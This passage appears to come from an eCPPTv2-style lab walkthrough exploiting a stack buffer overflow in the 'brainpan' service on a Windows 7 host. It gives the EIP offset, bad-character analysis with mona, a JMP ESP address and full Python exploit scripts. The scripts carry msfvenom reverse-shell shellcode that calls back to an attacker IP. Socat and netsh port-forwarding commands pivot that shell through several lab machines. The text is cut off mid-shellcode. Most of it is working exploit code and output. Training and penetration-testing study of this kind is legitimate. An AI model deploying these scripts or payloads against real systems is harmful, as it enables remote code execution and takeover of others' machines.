Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```

![](/assets/img/eCPPTv2/80.png)

As we can see the program crashes, and let's check what value has the `EIP`:

![](/assets/img/eCPPTv2/81.png)

Ok so the value `EIP` has changed (0x35724134). So with `pattern_offset` we can pass the memory direction of the `EIP` and it says that the number of bytes we need to input before we start modifying the `EIP` is **524**:

```zsh
❯ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x35724134
[*] Exact match at offset 524
```

Now with `python` we are creating a pattern with **524** "A", **4** "B" and **200** "C". If everything goes well, the `EIP` should change to `42424242`:

```zsh
❯ python3 -c 'print ("A"*524 + "B"*4 + "C"*200)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```

And as we can see, the `EIP` value changes:

![](/assets/img/eCPPTv2/82.png)

#### Installing and using `mona`
---

By checking where the `ESP` starts we can notice that it starts right after the `EIP` beggins. This is pretty interesting to know, because if now we achieve to the program execution path point to a memory direction in which we'll load some `NOPs` and then our `shellcode`, we could fully control the program.
Now we need to create a list with **all** characters to check the `badchars` of the program. To achieve that we are going to use the tool [mona](https://github.com/corelan/mona). So let's copy the content and paste it into a file called `mona.py`. 

>**Note:** W7 saves the file as a `txt` file, so just press **SHIFT + Right Click** and **Open command line here**. Then, change the filename:

![](/assets/img/eCPPTv2/83.png)

Now we must put the `mona.py` file into this directory:

![](/assets/img/eCPPTv2/84.png)

To check if everything went well, we can open `Inmunnity Debugger` and put `!mona` in command box:

![](/assets/img/eCPPTv2/85.png)

After that we can use `!mona bytearray` to generate a list of all chars, but we can know that in **all** programs the char `\x00` is **always** a badchar. So, now we are going to use `!mona bytearray -cpb "\x00"` so this will generate us a bytearray without this first character:

![](/assets/img/eCPPTv2/86.png)

Ok, so now we are going to create a new folder in which we are going to be storing the bytearray. Create it, and when its created, use `!mona config -set workingfolder C:\Users\debuggin\Desktop\Binary\%p`:

![](/assets/img/eCPPTv2/87.png)

If we execute again the byarray generator, we can see that is being created on our working folder:

![](/assets/img/eCPPTv2/88.png)

If we check this file we can see that its content is the output of `mona`:

![](/assets/img/eCPPTv2/89.png)

With this file created, we can easily transfer it to our machine. In our attacker machine we are going to create a shared folder and copy the file into it:

![](/assets/img/eCPPTv2/90.png)

![](/assets/img/eCPPTv2/91.png)

Now we can see that we've recived this file:

![](/assets/img/eCPPTv2/92.png)

We can use regex to get the interesting info:

![](/assets/img/eCPPTv2/93.png)

Ok, so this is what we're going to input in the `ESP` register in our python exploit:

```python
#!/usr/bin/python3
# By ruycr4ft

import socket
from struct import pack

offset = 524 # Number of junk bytes (adjust it to your target binary)
before_eip = b"A" * offset # This is the junk you input until you start modifying EIP
eip = b"B"*4 # EIP
after_eip = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff") # ESP

payload = before_eip + eip + after_eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.119", 9999)) # Host and port
s.send(payload)
s.close()
```

When you execute it, you should hear **BEEP**, which means that the **brainpan** process has been stopped on the `Inmunnity Debugger`. Now we can right click on `ESP` and `Follow in dump`. Here we will see all the characters:

![](/assets/img/eCPPTv2/94.png)

Now we need to see which characters are badchars. To achieve that we'll use `mona` again. We'll use `!mona compare -f C:\Users\debuggin\Desktop\Binary\_no_name\bytearray.bin -a 0x0022F930`:

![](/assets/img/eCPPTv2/95.png)

Ok so we can see that there isn't any badchar!
So now we can create a `shellcode` with `msfvenom`:

```zsh
❯ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.111 LPORT=443 --platform windows -a x86 -e x86/shikata_ga_nai -f c -b "\x00" EXITFUNC=thread
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1506 bytes
unsigned char buf[] = 
"\xbe\xbc\x59\x95\x29\xdb\xd6\xd9\x74\x24\xf4\x5a\x2b\xc9"
"\xb1\x52\x83\xea\xfc\x31\x72\x0e\x03\xce\x57\x77\xdc\xd2"
"\x80\xf5\x1f\x2a\x51\x9a\x96\xcf\x60\x9a\xcd\x84\xd3\x2a"
"\x85\xc8\xdf\xc1\xcb\xf8\x54\xa7\xc3\x0f\xdc\x02\x32\x3e"
"\xdd\x3f\x06\x21\x5d\x42\x5b\x81\x5c\x8d\xae\xc0\x99\xf0"
"\x43\x90\x72\x7e\xf1\x04\xf6\xca\xca\xaf\x44\xda\x4a\x4c"
"\x1c\xdd\x7b\xc3\x16\x84\x5b\xe2\xfb\xbc\xd5\xfc\x18\xf8"
"\xac\x77\xea\x76\x2f\x51\x22\x76\x9c\x9c\x8a\x85\xdc\xd9"
"\x2d\x76\xab\x13\x4e\x0b\xac\xe0\x2c\xd7\x39\xf2\x97\x9c"
"\x9a\xde\x26\x70\x7c\x95\x25\x3d\x0a\xf1\x29\xc0\xdf\x8a"
"\x56\x49\xde\x5c\xdf\x09\xc5\x78\xbb\xca\x64\xd9\x61\xbc"
"\x99\x39\xca\x61\x3c\x32\xe7\x76\x4d\x19\x60\xba\x7c\xa1"
"\x70\xd4\xf7\xd2\x42\x7b\xac\x7c\xef\xf4\x6a\x7b\x10\x2f"
"\xca\x13\xef\xd0\x2b\x3a\x34\x84\x7b\x54\x9d\xa5\x17\xa4"
"\x22\x70\xb7\xf4\x8c\x2b\x78\xa4\x6c\x9c\x10\xae\x62\xc3"
"\x01\xd1\xa8\x6c\xab\x28\x3b\x53\x84\x32\xd4\x3b\xd7\x32"
"\x2b\x07\x5e\xd4\x41\x67\x37\x4f\xfe\x1e\x12\x1b\x9f\xdf"
"\x88\x66\x9f\x54\x3f\x97\x6e\x9d\x4a\x8b\x07\x6d\x01\xf1"
"\x8e\x72\xbf\x9d\x4d\xe0\x24\x5d\x1b\x19\xf3\x0a\x4c\xef"
"\x0a\xde\x60\x56\xa5\xfc\x78\x0e\x8e\x44\xa7\xf3\x11\x45"
"\x2a\x4f\x36\x55\xf2\x50\x72\x01\xaa\x06\x2c\xff\x0c\xf1"
"\x9e\xa9\xc6\xae\x48\x3d\x9e\x9c\x4a\x3b\x9f\xc8\x3c\xa3"
"\x2e\xa5\x78\xdc\x9f\x21\x8d\xa5\xfd\xd1\x72\x7c\x46\xf1"
"\x90\x54\xb3\x9a\x0c\x3d\x7e\xc7\xae\xe8\xbd\xfe\x2c\x18"
"\x3e\x05\x2c\x69\x3b\x41\xea\x82\x31\xda\x9f\xa4\xe6\xdb"
"\xb5";
```

Now our python script would be looking like this, but we need to modify some things, so its not finished yet:

```python
#!/usr/bin/python3
# By ruycr4ft

import socket
from struct import pack

offset = 524 # Number of junk bytes (adjust it to your target binary)
before_eip = b"A" * offset # This is the junk you input until you start modifying EIP
eip = b"B"*4 # jmp ESP
shellcode = ("b\xbe\xbc\x59\x95\x29\xdb\xd6\xd9\x74\x24\xf4\x5a\x2b\xc9"
b"\xb1\x52\x83\xea\xfc\x31\x72\x0e\x03\xce\x57\x77\xdc\xd2"
b"\x80\xf5\x1f\x2a\x51\x9a\x96\xcf\x60\x9a\xcd\x84\xd3\x2a"
b"\x85\xc8\xdf\xc1\xcb\xf8\x54\xa7\xc3\x0f\xdc\x02\x32\x3e"
b"\xdd\x3f\x06\x21\x5d\x42\x5b\x81\x5c\x8d\xae\xc0\x99\xf0"
b"\x43\x90\x72\x7e\xf1\x04\xf6\xca\xca\xaf\x44\xda\x4a\x4c"
b"\x1c\xdd\x7b\xc3\x16\x84\x5b\xe2\xfb\xbc\xd5\xfc\x18\xf8"
b"\xac\x77\xea\x76\x2f\x51\x22\x76\x9c\x9c\x8a\x85\xdc\xd9"
b"\x2d\x76\xab\x13\x4e\x0b\xac\xe0\x2c\xd7\x39\xf2\x97\x9c"
b"\x9a\xde\x26\x70\x7c\x95\x25\x3d\x0a\xf1\x29\xc0\xdf\x8a"             # Shellcode that will create a reverse shell to the host 192.168.0.111 on the port 443
b"\x56\x49\xde\x5c\xdf\x09\xc5\x78\xbb\xca\x64\xd9\x61\xbc"
b"\x99\x39\xca\x61\x3c\x32\xe7\x76\x4d\x19\x60\xba\x7c\xa1"
b"\x70\xd4\xf7\xd2\x42\x7b\xac\x7c\xef\xf4\x6a\x7b\x10\x2f"
b"\xca\x13\xef\xd0\x2b\x3a\x34\x84\x7b\x54\x9d\xa5\x17\xa4"
b"\x22\x70\xb7\xf4\x8c\x2b\x78\xa4\x6c\x9c\x10\xae\x62\xc3"
b"\x01\xd1\xa8\x6c\xab\x28\x3b\x53\x84\x32\xd4\x3b\xd7\x32"
b"\x2b\x07\x5e\xd4\x41\x67\x37\x4f\xfe\x1e\x12\x1b\x9f\xdf"
b"\x88\x66\x9f\x54\x3f\x97\x6e\x9d\x4a\x8b\x07\x6d\x01\xf1"
b"\x8e\x72\xbf\x9d\x4d\xe0\x24\x5d\x1b\x19\xf3\x0a\x4c\xef"
b"\x0a\xde\x60\x56\xa5\xfc\x78\x0e\x8e\x44\xa7\xf3\x11\x45"
b"\x2a\x4f\x36\x55\xf2\x50\x72\x01\xaa\x06\x2c\xff\x0c\xf1"
b"\x9e\xa9\xc6\xae\x48\x3d\x9e\x9c\x4a\x3b\x9f\xc8\x3c\xa3"
b"\x2e\xa5\x78\xdc\x9f\x21\x8d\xa5\xfd\xd1\x72\x7c\x46\xf1"
b"\x90\x54\xb3\x9a\x0c\x3d\x7e\xc7\xae\xe8\xbd\xfe\x2c\x18"
b"\x3e\x05\x2c\x69\x3b\x41\xea\x82\x31\xda\x9f\xa4\xe6\xdb"
b"\xb5")

payload = before_eip + eip + after_eip

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.119", 9999)) # Host and port
s.send(payload)
s.close()
```

Now we need to know the memory direction of the `EIP` so an OpCode can be stablished. But if you remember, in order to this attack can be performed successfully, `NX` must be disabled. How can we check that? Well, we are going to use `!mona modules`:

![](/assets/img/eCPPTv2/96.png)

Great, so we can see that **all** protections are disabled! Now we are going to use `nasm_shell` to find the OpCode:

![](/assets/img/eCPPTv2/97.png)

Perfect! So now we are going back to the debugging machine and execute `!mona find -s "\xFF\xE4" -m brainpan.exe`:

![](/assets/img/eCPPTv2/98.png)

Great! So here we are getting the memory direction `0x311712f3`. Now if we search for that memory direction:

![](/assets/img/eCPPTv2/99.png)

Perfect so the `jmp ESP` is correct. With **F2** we can establish a `breakpoint` so we can check if the program stops there:

![](/assets/img/eCPPTv2/100.png)

Now we can edit our exploit to add the the memory direction:

```python
#!/usr/bin/python3
# By ruycr4ft

import socket
from struct import pack

offset = 524 # Number of junk bytes (adjust it to your target binary)
before_eip = b"A" * offset # This is the junk you input until you start modifying EIP
eip = pack("<I", 0x311712f3) # jmp ESP

shellcode = (b"\xbe\xbc\x59\x95\x29\xdb\xd6\xd9\x74\x24\xf4\x5a\x2b\xc9"
b"\xb1\x52\x83\xea\xfc\x31\x72\x0e\x03\xce\x57\x77\xdc\xd2"
b"\x80\xf5\x1f\x2a\x51\x9a\x96\xcf\x60\x9a\xcd\x84\xd3\x2a"
b"\x85\xc8\xdf\xc1\xcb\xf8\x54\xa7\xc3\x0f\xdc\x02\x32\x3e"
b"\xdd\x3f\x06\x21\x5d\x42\x5b\x81\x5c\x8d\xae\xc0\x99\xf0"
b"\x43\x90\x72\x7e\xf1\x04\xf6\xca\xca\xaf\x44\xda\x4a\x4c"
b"\x1c\xdd\x7b\xc3\x16\x84\x5b\xe2\xfb\xbc\xd5\xfc\x18\xf8"
b"\xac\x77\xea\x76\x2f\x51\x22\x76\x9c\x9c\x8a\x85\xdc\xd9"
b"\x2d\x76\xab\x13\x4e\x0b\xac\xe0\x2c\xd7\x39\xf2\x97\x9c"
b"\x9a\xde\x26\x70\x7c\x95\x25\x3d\x0a\xf1\x29\xc0\xdf\x8a"             # Shellcode that will create a reverse shell to the host 192.168.0.111 on the port 443
b"\x56\x49\xde\x5c\xdf\x09\xc5\x78\xbb\xca\x64\xd9\x61\xbc"
b"\x99\x39\xca\x61\x3c\x32\xe7\x76\x4d\x19\x60\xba\x7c\xa1"
b"\x70\xd4\xf7\xd2\x42\x7b\xac\x7c\xef\xf4\x6a\x7b\x10\x2f"
b"\xca\x13\xef\xd0\x2b\x3a\x34\x84\x7b\x54\x9d\xa5\x17\xa4"
b"\x22\x70\xb7\xf4\x8c\x2b\x78\xa4\x6c\x9c\x10\xae\x62\xc3"
b"\x01\xd1\xa8\x6c\xab\x28\x3b\x53\x84\x32\xd4\x3b\xd7\x32"
b"\x2b\x07\x5e\xd4\x41\x67\x37\x4f\xfe\x1e\x12\x1b\x9f\xdf"
b"\x88\x66\x9f\x54\x3f\x97\x6e\x9d\x4a\x8b\x07\x6d\x01\xf1"
b"\x8e\x72\xbf\x9d\x4d\xe0\x24\x5d\x1b\x19\xf3\x0a\x4c\xef"
b"\x0a\xde\x60\x56\xa5\xfc\x78\x0e\x8e\x44\xa7\xf3\x11\x45"
b"\x2a\x4f\x36\x55\xf2\x50\x72\x01\xaa\x06\x2c\xff\x0c\xf1"
b"\x9e\xa9\xc6\xae\x48\x3d\x9e\x9c\x4a\x3b\x9f\xc8\x3c\xa3"
b"\x2e\xa5\x78\xdc\x9f\x21\x8d\xa5\xfd\xd1\x72\x7c\x46\xf1"
b"\x90\x54\xb3\x9a\x0c\x3d\x7e\xc7\xae\xe8\xbd\xfe\x2c\x18"
b"\x3e\x05\x2c\x69\x3b\x41\xea\x82\x31\xda\x9f\xa4\xe6\xdb"
b"\xb5")

payload = before_eip + eip + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.119", 9999)) # Host and port
s.send(payload)
s.close()
```

If we execute it, we can notice that the `EIP` has changed to the one we've indicated:

![](/assets/img/eCPPTv2/101.png)

Ok, so we've reached the breakpoing. If everything goes well, because here is an OpCode that is jumping to the `ESP`, so if we go to the next instruction, the `ESP` value shoul be the same as the `EIP` value:

![](/assets/img/eCPPTv2/102.png)

All right! So the program's execution path is going to the stack, and because the stack matches with the start of our `shellcode`, this should be interpreted. To avoid errors, we are going to add some NOPs, so the program execution path has a little margin so the `shellcode` can be executed successfully:

```python
#!/usr/bin/python3
# By ruycr4ft

import socket
from struct import pack

offset = 524 # Number of junk bytes (adjust it to your target binary)
before_eip = b"A" * offset # This is the junk you input until you start modifying EIP
eip = pack("<I", 0x311712f3) # jmp ESP

shellcode = (b"\xbe\xbc\x59\x95\x29\xdb\xd6\xd9\x74\x24\xf4\x5a\x2b\xc9"
b"\xb1\x52\x83\xea\xfc\x31\x72\x0e\x03\xce\x57\x77\xdc\xd2"
b"\x80\xf5\x1f\x2a\x51\x9a\x96\xcf\x60\x9a\xcd\x84\xd3\x2a"
b"\x85\xc8\xdf\xc1\xcb\xf8\x54\xa7\xc3\x0f\xdc\x02\x32\x3e"
b"\xdd\x3f\x06\x21\x5d\x42\x5b\x81\x5c\x8d\xae\xc0\x99\xf0"
b"\x43\x90\x72\x7e\xf1\x04\xf6\xca\xca\xaf\x44\xda\x4a\x4c"
b"\x1c\xdd\x7b\xc3\x16\x84\x5b\xe2\xfb\xbc\xd5\xfc\x18\xf8"
b"\xac\x77\xea\x76\x2f\x51\x22\x76\x9c\x9c\x8a\x85\xdc\xd9"
b"\x2d\x76\xab\x13\x4e\x0b\xac\xe0\x2c\xd7\x39\xf2\x97\x9c"
b"\x9a\xde\x26\x70\x7c\x95\x25\x3d\x0a\xf1\x29\xc0\xdf\x8a"             # Shellcode that will create a reverse shell to the host 192.168.0.111 on the port 443
b"\x56\x49\xde\x5c\xdf\x09\xc5\x78\xbb\xca\x64\xd9\x61\xbc"
b"\x99\x39\xca\x61\x3c\x32\xe7\x76\x4d\x19\x60\xba\x7c\xa1"
b"\x70\xd4\xf7\xd2\x42\x7b\xac\x7c\xef\xf4\x6a\x7b\x10\x2f"
b"\xca\x13\xef\xd0\x2b\x3a\x34\x84\x7b\x54\x9d\xa5\x17\xa4"
b"\x22\x70\xb7\xf4\x8c\x2b\x78\xa4\x6c\x9c\x10\xae\x62\xc3"
b"\x01\xd1\xa8\x6c\xab\x28\x3b\x53\x84\x32\xd4\x3b\xd7\x32"
b"\x2b\x07\x5e\xd4\x41\x67\x37\x4f\xfe\x1e\x12\x1b\x9f\xdf"
b"\x88\x66\x9f\x54\x3f\x97\x6e\x9d\x4a\x8b\x07\x6d\x01\xf1"
b"\x8e\x72\xbf\x9d\x4d\xe0\x24\x5d\x1b\x19\xf3\x0a\x4c\xef"
b"\x0a\xde\x60\x56\xa5\xfc\x78\x0e\x8e\x44\xa7\xf3\x11\x45"
b"\x2a\x4f\x36\x55\xf2\x50\x72\x01\xaa\x06\x2c\xff\x0c\xf1"
b"\x9e\xa9\xc6\xae\x48\x3d\x9e\x9c\x4a\x3b\x9f\xc8\x3c\xa3"
b"\x2e\xa5\x78\xdc\x9f\x21\x8d\xa5\xfd\xd1\x72\x7c\x46\xf1"
b"\x90\x54\xb3\x9a\x0c\x3d\x7e\xc7\xae\xe8\xbd\xfe\x2c\x18"
b"\x3e\x05\x2c\x69\x3b\x41\xea\x82\x31\xda\x9f\xa4\xe6\xdb"
b"\xb5")

payload = before_eip + eip + b"\x90"*16 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.119", 9999)) # Host and port
s.send(payload)
s.close()
```

So, if we first run again the program in the W7 machine, after that we start a `netcat` listener on the port specified (443) and then execute the exploit, we should get an interactive session:

![](/assets/img/eCPPTv2/103.png)

![](/assets/img/eCPPTv2/104.png)

Nice! So this buffer overflow attack was successful!! Now the only thing we need to do is to change the IP and port so the reverse shell can be sent through all the tunnels!

### Exploiting BoF on the victim machine
---

Ok so the idea is to redirect the connection of all the tunnels; we are going to be listening on port **4848** on our attacker machine, but we need to redirect the whole connection to that port:

```zsh
# Matrix
root@porteus:~# ./socat TCP-LISTEN:3434,fork TCP:192.168.58.4:3535

# Dumbledore
netsh interface portproxy add v4tov4 listenport=3535 listenaddress=0.0.0.0 connectport=3636 connectaddress=192.168.57.11

# Nagini
root@Nagini:~# ./socat TCP-LISTEN:3636,fork TCP:192.168.56.6:3737

# Aragog
root@Aragog:~# ./socat TCP-LISTEN:3737,fork TCP:192.168.0.111:4848
```

Now we just need to edit our `shellcode` so the reverse shell is going to be sended to the `Matrix` machine, and from that point the connection will be redirected to our machine. This is how we can edit our `shellcode`:

```zsh
❯ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.59.4 LPORT=3535 --platform windows -a x86 -e x86/shikata_ga_nai -f c -b "\x00" EXITFUNC=thread
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1506 bytes
unsigned char buf[] = 
"\xbb\x63\x91\x8a\xc1\xdb\xd6\xd9\x74\x24\xf4\x5d\x29\xc9"
"\xb1\x52\x31\x5d\x12\x83\xc5\x04\x03\x3e\x9f\x68\x34\x3c"
"\x77\xee\xb7\xbc\x88\x8f\x3e\x59\xb9\x8f\x25\x2a\xea\x3f"
"\x2d\x7e\x07\xcb\x63\x6a\x9c\xb9\xab\x9d\x15\x77\x8a\x90"
"\xa6\x24\xee\xb3\x24\x37\x23\x13\x14\xf8\x36\x52\x51\xe5"
"\xbb\x06\x0a\x61\x69\xb6\x3f\x3f\xb2\x3d\x73\xd1\xb2\xa2"
"\xc4\xd0\x93\x75\x5e\x8b\x33\x74\xb3\xa7\x7d\x6e\xd0\x82"
"\x34\x05\x22\x78\xc7\xcf\x7a\x81\x64\x2e\xb3\x70\x74\x77"
"\x74\x6b\x03\x81\x86\x16\x14\x56\xf4\xcc\x91\x4c\x5e\x86"
"\x02\xa8\x5e\x4b\xd4\x3b\x6c\x20\x92\x63\x71\xb7\x77\x18"
"\x8d\x3c\x76\xce\x07\x06\x5d\xca\x4c\xdc\xfc\x4b\x29\xb3"
"\x01\x8b\x92\x6c\xa4\xc0\x3f\x78\xd5\x8b\x57\x4d\xd4\x33"
"\xa8\xd9\x6f\x40\x9a\x46\xc4\xce\x96\x0f\xc2\x09\xd8\x25"
"\xb2\x85\x27\xc6\xc3\x8c\xe3\x92\x93\xa6\xc2\x9a\x7f\x36"
"\xea\x4e\x2f\x66\x44\x21\x90\xd6\x24\x91\x78\x3c\xab\xce"
"\x99\x3f\x61\x67\x33\xba\xe2\x48\x6c\xfe\xf1\x20\x6f\xfe"
"\xf8\x7f\xe6\x18\x68\x90\xaf\xb3\x05\x09\xea\x4f\xb7\xd6"
"\x20\x2a\xf7\x5d\xc7\xcb\xb6\x95\xa2\xdf\x2f\x56\xf9\xbd"
"\xe6\x69\xd7\xa9\x65\xfb\xbc\x29\xe3\xe0\x6a\x7e\xa4\xd7"
"\x62\xea\x58\x41\xdd\x08\xa1\x17\x26\x88\x7e\xe4\xa9\x11"
"\xf2\x50\x8e\x01\xca\x59\x8a\x75\x82\x0f\x44\x23\x64\xe6"
"\x26\x9d\x3e\x55\xe1\x49\xc6\x95\x32\x0f\xc7\xf3\xc4\xef"
"\x76\xaa\x90\x10\xb6\x3a\x15\x69\xaa\xda\xda\xa0\x6e\xfa"
"\x38\x60\x9b\x93\xe4\xe1\x26\xfe\x16\xdc\x65\x07\x95\xd4"
"\x15\xfc\x85\x9d\x10\xb8\x01\x4e\x69\xd1\xe7\x70\xde\xd2"
"\x2d";
```

```python
#!/usr/bin/python3
# By ruycr4ft

import socket
from struct import pack

offset = 524 # Number of junk bytes (adjust it to your target binary)
before_eip = b"A" * offset # This is the junk you input until you start modifying EIP
eip = pack("<I", 0x311712f3) # jmp ESP

shellcode = (b"\xbb\x63\x91\x8a\xc1\xdb\xd6\xd9\x74\x24\xf4\x5d\x29\xc9"
b"\xb1\x52\x31\x5d\x12\x83\xc5\x04\x03\x3e\x9f\x68\x34\x3c"
b"\x77\xee\xb7\xbc\x88\x8f\x3e\x59\xb9\x8f\x25\x2a\xea\x3f"
b"\x2d\x7e\x07\xcb\x63\x6a\x9c\xb9\xab\x9d\x15\x77\x8a\x90"
b"\xa6\x24\xee\xb3\x24\x37\x23\x13\x14\xf8\x36\x52\x51\xe5"
b"\xbb\x06\x0a\x61\x69\xb6\x3f\x3f\xb2\x3d\x73\xd1\xb2\xa2"
b"\xc4\xd0\x93\x75\x5e\x8b\x33\x74\xb3\xa7\x7d\x6e\xd0\x82"
b"\x34\x05\x22\x78\xc7\xcf\x7a\x81\x64\x2e\xb3\x70\x74\x77"
b"\x74\x6b\x03\x81\x86\x16\x14\x56\xf4\xcc\x91\x4c\x5e\x86"
b"\x02\xa8\x5e\x4b\xd4\x3b\x6c\x20\x92\x63\x71\xb7\x77\x18"
b"\x8d\x3c\x76\xce\x07\x06\x5d\xca\x4c\xdc\xfc\x4b\x29\xb3"
b"\x01\x8b\x92\x6c\xa4\xc0\x3f\x78\xd5\x8b\x57\x4d\xd4\x33"
b"\xa8\xd9\x6f\x40\x9a\x46\xc4\xce\x96\x0f\xc2\x09\xd8\x25"
b"\xb2\x85\x27\xc6\xc3\x8c\xe3\x92\x93\xa6\xc2\x9a\x7f\x36"
b"\xea\x4e\x2f\x66\x44\x21\x90\xd6\x24\x91\x78\x3c\xab\xce"
b"\x99\x3f\x61\x67\x33\xba\xe2\x48\x6c\xfe\xf1\x20\x6f\xfe"
b"\xf8\x7f\xe6\x18\x68\x90\xaf\xb3\x05\x09\xea\x4f\xb7\xd6"
b"\x20\x2a\xf7\x5d\xc7\xcb\xb6\x95\xa2\xdf\x2f\x56\xf9\xbd"
b"\xe6\x69\xd7\xa9\x65\xfb\xbc\x29\xe3\xe0\x6a\x7e\xa4\xd7"
b"\x62\xea\x58\x41\xdd\x08\xa1\x17\x26\x88\x7e\xe4\xa9\x11"
b"\xf2\x50\x8e\x01\xca\x59\x8a\x75\x82\x0f\x44\x23\x64\xe6"
b"\x26\x9d\x3e\x55\xe1\x49\xc6\x95\x32\x0f\xc7\xf3\xc4\xef"
b"\x76\xaa\x90\x10\xb6\x3a\x15\x69\xaa\xda\xda\xa0\x6e\xfa"
